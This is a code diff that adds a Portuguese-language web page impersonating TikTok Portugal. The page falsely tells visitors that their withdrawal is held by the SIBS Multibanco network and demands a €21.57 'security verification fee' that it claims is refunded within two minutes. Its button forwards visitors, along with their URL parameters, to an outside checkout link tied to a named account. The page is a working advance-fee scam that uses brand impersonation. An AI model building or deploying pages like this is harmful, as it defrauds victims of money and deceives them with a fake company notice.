@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Pagamento 3</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap">
+
+</head>
+
+<body>
+  <style>
+    body {
+      font-family: "Inter", sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f6f9;
+      color: #333;
+      text-align: center;
+    }
+
+    header {
+      background-color: #0eab3f;
+      color: #fff;
+      padding: 1rem 0;
+    }
+
+    header h1 {
+      margin: 0;
+      font-size: 1.5rem;
+    }
+
+    .content {
+      max-width: 600px;
+      margin: 2rem auto;
+      padding: 1rem;
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    }
+
+    .content img {
+      width: 100px;
+      margin: 1rem 0;
+    }
+
+    .content h2 {
+      font-size: 1.8rem;
+      color: #0eab3f;
+      margin-bottom: 1rem;
+    }
+
+    .content p {
+      line-height: 1.6;
+    }
+
+    .content .highlight {
+      font-weight: bold;
+      color: #0eab3f;
+    }
+
+    .button {
+      display: inline-block;
+      margin-top: 1.5rem;
+      padding: 0.8rem 1.5rem;
+      font-size: 1rem;
+      font-weight: bold;
+      color: #fff;
+      background: #0eab3f;
+      border: none;
+      border-radius: 25px;
+      text-decoration: none;
+      transition: background 0.3s;
+    }
+
+    .button:hover {
+      background: #09912e;
+    }
+
+    footer {
+      margin-top: 2rem;
+      font-size: 0.9rem;
+      color: #666;
+    }
+
+    @media (max-width: 480px) {
+      header h1 {
+        font-size: 1.2rem;
+      }
+
+      .content h2 {
+        font-size: 1.5rem;
+      }
+
+      .content {
+        padding: 1rem;
+      }
+    }
+  </style>
+
+
+  <header>
+    <h1>ATENÇÃO</h1>
+  </header>
+
+  <div class="content">
+    <img src="/logo.svg" alt="TikTok Logo" class="logo">
+    <h2>Levantamento retido temporariamente!</h2>
+    <p>
+      <strong>O seu saldo já está pronto a ser enviado</strong>, mas a transferência foi
+      interrompida pela
+      <span class="highlight">rede SIBS (Multibanco)</span>.
+    </p>
+    <p>
+      Para garantir a segurança e validar a sua conta, é necessário pagar uma
+      <span class="highlight">taxa de verificação de segurança</span>. Este valor
+      será devolvido à sua conta em até <strong>2 minutos</strong> após o pagamento.
+    </p>
+    <p>
+      <strong>Valor da taxa:</strong>
+      <span class="highlight">€21,57</span>
+    </p>
+    <button onclick="redirectToPayment()" class="button">
+      Pagar Taxa e Desbloquear Levantamento
+    </button>
+  </div>
+
+  <script>
+    // Função para capturar os parâmetros GET da URL atual
+    function getUrlParams() {
+      const params = new URLSearchParams(window.location.search);
+      let paramsObject = {};
+      params.forEach((value, key) => {
+        paramsObject[key] = value;
+      });
+      return paramsObject;
+    }
+
+    function redirectToPayment() {
+      const params = new URLSearchParams(window.location.search);
+      const checkoutUrl = new URL('https://waymb.com/c?username=eduardotreonix&product=4');
+
+      params.forEach((value, key) => {
+        checkoutUrl.searchParams.set(key, value);
+      });
+
+      window.location.href = checkoutUrl.toString();
+    }
+  </script>
+
+  <footer>
+    <p>© 2026 Tiktok Portugal.</p>
+  </footer>
+
+
+</body>
+
+</html>
